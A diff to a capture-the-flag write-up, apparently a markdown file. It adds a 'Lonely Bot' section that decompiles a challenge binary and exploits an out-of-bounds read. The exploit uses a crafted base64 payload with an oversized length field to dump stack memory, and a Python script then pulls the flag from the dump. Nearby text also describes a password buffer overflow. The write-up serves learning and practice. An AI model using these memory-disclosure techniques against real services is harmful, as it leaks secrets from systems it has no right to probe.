@@ -767,7 +767,7 @@ for name in zip_data.namelist():
 ```
 
 Which shows all the company secrets, along with the flag in `flag.txt`.
-The code to do all ths is in the RansomSolver.ipynb Jupyter Notebook.
+The code to do all this is in the RansomSolver.ipynb Jupyter Notebook.
 
 
 ### Exploitation
@@ -778,6 +778,230 @@ The data which will be read into the `password` buffer will overflow into the `a
 Since `authenticated` is being checked like a boolean, any value other than `0` will work to obtain success.
 
 Using the input `1234567890ab0` will fill password with the chars `"1234567890ab"` while the `char` `'0'` will be read into `authenticated`, since `authenticated` is an `int` this means `'0'` will be cast to its ASCII value 48.
+
+
+#### Lonely Bot (175 points)
+The inputs for the problem allow us to either specify the flag found, or give strings, hinted to be base64 encoded, to be sent to the server, and we receive responses, which are printed in the Console. The responses seem to be from the server running the binary lonelybot provided.
+
+Opening the binary in Ghidra we see the `main` function starts by checking the commandline arguments, the first being `"--help"` which calls the `print_help` function, which prints:
+
+```
+I will decode valid base64 and treat it as the following C struct
+```
+
+```C
+#define MAX_LEN 50
+struct MESSAGE {
+    unsigned short type;
+    unsigned short message_le n;
+    char message[];
+}
+```
+
+That's helpful!
+
+The second commandline argument is `"--flag"`, which simply prints that the flag specified after, and we see it's stored in `argv[2]`.
+
+So the flag isn't in the binary itself, but is in the stack memory the lonelybot program running on the server. From the output we receive, the program is already past the `print_welcome` function, so we can't set it outselves: we need to exploit the bot with input to get it to dump to us the stack memory.
+
+Given the information so far, we can complete the decompile, the trickiest part being the `MESSAGE` struct type of the decoded buffer.
+
+```C
+
+/* WARNING: Restarted to delay deadcode elimination for space: stack */
+
+int main(int argc,char **argv)
+
+{
+  long lVar1;
+  int strcmp_val;
+  time_t t;
+  char *response_ptr;
+  long in_FS_OFFSET;
+  uint i;
+  char uinput1 [51];
+  MESSAGE b64_value;
+  
+  lVar1 = *(long *)(in_FS_OFFSET + 40);
+  uinput1[0] = '\0';
+  uinput1[1] = '\0';
+  uinput1[2] = '\0';
+  uinput1[3] = '\0';
+  uinput1[4] = '\0';
+  uinput1[5] = '\0';
+  uinput1[6] = '\0';
+  uinput1[7] = '\0';
+  uinput1[8] = '\0';
+  uinput1[9] = '\0';
+  uinput1[10] = '\0';
+  uinput1[11] = '\0';
+  uinput1[12] = '\0';
+  uinput1[13] = '\0';
+  uinput1[14] = '\0';
+  uinput1[15] = '\0';
+  uinput1[16] = '\0';
+  uinput1[17] = '\0';
+  uinput1[18] = '\0';
+  uinput1[19] = '\0';
+  uinput1[20] = '\0';
+  uinput1[21] = '\0';
+  uinput1[22] = '\0';
+  uinput1[23] = '\0';
+  uinput1[24] = '\0';
+  uinput1[25] = '\0';
+  uinput1[26] = '\0';
+  uinput1[27] = '\0';
+  uinput1[28] = '\0';
+  uinput1[29] = '\0';
+  uinput1[30] = '\0';
+  uinput1[31] = '\0';
+  uinput1[32] = '\0';
+  uinput1[33] = '\0';
+  uinput1[34] = '\0';
+  uinput1[35] = '\0';
+  uinput1[36] = '\0';
+  uinput1[37] = '\0';
+  uinput1[38] = '\0';
+  uinput1[39] = '\0';
+  uinput1[40] = '\0';
+  uinput1[41] = '\0';
+  uinput1[42] = '\0';
+  uinput1[43] = '\0';
+  uinput1[44] = '\0';
+  uinput1[45] = '\0';
+  uinput1[46] = '\0';
+  uinput1[47] = '\0';
+  uinput1[48] = '\0';
+  uinput1[49] = '\0';
+  uinput1[50] = '\0';
+  b64_value.type = 0;
+  b64_value.message_len = 0;
+  b64_value.message[0] = '\0';
+  b64_value.message[1] = '\0';
+  b64_value.message[2] = '\0';
+  b64_value.message[3] = '\0';
+  b64_value.message[4] = '\0';
+  b64_value.message[5] = '\0';
+  b64_value.message[6] = '\0';
+  b64_value.message[7] = '\0';
+  b64_value.message[8] = '\0';
+  b64_value.message[9] = '\0';
+  b64_value.message[10] = '\0';
+  b64_value.message[11] = '\0';
+  b64_value.message[12] = '\0';
+  b64_value.message[13] = '\0';
+  b64_value.message[14] = '\0';
+  b64_value.message[15] = '\0';
+  b64_value.message[16] = '\0';
+  b64_value.message[17] = '\0';
+  b64_value.message[18] = '\0';
+  b64_value.message[19] = '\0';
+  b64_value.message[20] = '\0';
+  b64_value.message[21] = '\0';
+  b64_value.message[22] = '\0';
+  b64_value.message[23] = '\0';
+  b64_value.message[24] = '\0';
+  b64_value.message[25] = '\0';
+  b64_value.message[26] = '\0';
+  b64_value.message[27] = '\0';
+  b64_value.message[28] = '\0';
+  b64_value.message[29] = '\0';
+  b64_value.message[30] = '\0';
+  b64_value.message[31] = '\0';
+  b64_value.message[32] = '\0';
+  b64_value.message[33] = '\0';
+  b64_value.message[34] = '\0';
+  b64_value.message[35] = '\0';
+  b64_value.message[36] = '\0';
+  b64_value.message[37] = '\0';
+  b64_value.message[38] = '\0';
+  b64_value.message[39] = '\0';
+  b64_value.message[40] = '\0';
+  b64_value.message[41] = '\0';
+  b64_value.message[42] = '\0';
+  b64_value.message[43] = '\0';
+  b64_value.message[44] = '\0';
+  b64_value.message[45] = '\0';
+  b64_value.message[46] = '\0';
+  t = time((time_t *)0);
+  srandom((uint)t);
+  if (1 < argc) {
+    strcmp_val = strcmp(argv[1],"--help");
+    if (strcmp_val == 0) {
+      print_help();
+      if (lVar1 == *(long *)(in_FS_OFFSET + 40)) {
+        return 0;
+      }
+                    /* WARNING: Subroutine does not return */
+      __stack_chk_fail();
+    }
+    strcmp_val = strcmp(argv[1],"--flag");
+    if ((strcmp_val == 0) && (2 < argc)) {
+      printf("\nFlag specified on command line: %s\n\n",argv[2]);
+    }
+  }
+  print_welcome();
+  puts("Hello. How are you? (CNTRL+C to quit)");
+  do {
+    while( true ) {
+      memset(uinput1,0,51);
+      memset(&b64_value,0,51);
+      printf("base64> ");
+      fgets(uinput1,50,(FILE *)stdin);
+      strcmp_val = Base64decode_len(uinput1);
+      if (strcmp_val < 51) break;
+      puts("That message is too long for me to handle");
+    }
+    Base64decode((byte *)&b64_value,(byte *)uinput1);
+    if (b64_value.type == 69) {
+      g_debug = 1;
+      puts("Now you\'re speaking my language!!");
+    }
+    else if (b64_value.type == 1337) {
+      g_leet = 1;
+      puts("1337 5p34k 3n4b13d");
+    }
+    if (g_debug != 0) {
+      puts("Here\'s everything I know about that:");
+      for (i = 0; (int)i < (int)(uint)b64_value.message_len; i = i + 1) {
+        if ((i != 0) && ((i & 15) == 0)) {
+          putchar(L'\n');
+        }
+        printf("%02x ",(ulong)(byte)b64_value.message[(int)i]);
+      }
+      putchar(L'\n');
+    }
+    response_ptr = get_reponse();
+    puts(response_ptr);
+    puts("Please, tell me more.");
+  } while( true );
+}
+```
+
+So the user input, which goes into `uinput1` is then decoded into bytes put into the `b64_value` `MESSAGE` struct. If `b64_value.type == 69` the bot will print in hex the contents of `b64_value.message`, using `b64_value.message_len` to tell how long it should be. However since we specify `b64_value.message_len` we can tell it to go past the maximum bounds and spill the stack contents.
+
+So how do we craft our input? We can use Python's `struct` and `base64` libraries to do the work for us:
+
+```Python
+ushort_max = 2**16-1
+print(base64.b64encode(struct.pack("HH",69,ushort_max)).decode())
+```
+
+Since `b64_value.type` and `b64_value.message_len` are both `unsigned short`s they are 2 bytes long, and therefore have a maximum value of `2**16-1` which we might as well use for the message length to get as much of the stack as possible. Python's `struct` library uses `"H"` as the format specifier for `unsigned short` and will pack the values given into a byte string. Note we don't actually need to provide any data to fill the message with.
+
+This gives a base64 encoded message of `"RQD//w=="`.
+
+Providing this input to the bot sure enough causes it to return a pile of hex encoded data, ending in a segmentation fault as we run past the stack's end. But we do have the data!
+
+We can copy it from the console, then search for the location of `argv[1]` which we know will contain `"--flag"`, then simply look at the next string after. Both should be terminated by the null byte, as per standard.
+
+```Python
+stack_contents = bytes.fromhex(""" {PASTE-HERE} """)
+flag_location = stack_contents.find(b'--flag')
+print(stack_contents[flag_location:].split(b'\x00')[1].decode())
+```
+
+The code to do all this is in the LonelyBotSolver.ipynb Jupyter Notebook.
 
 
 ### Input Validation
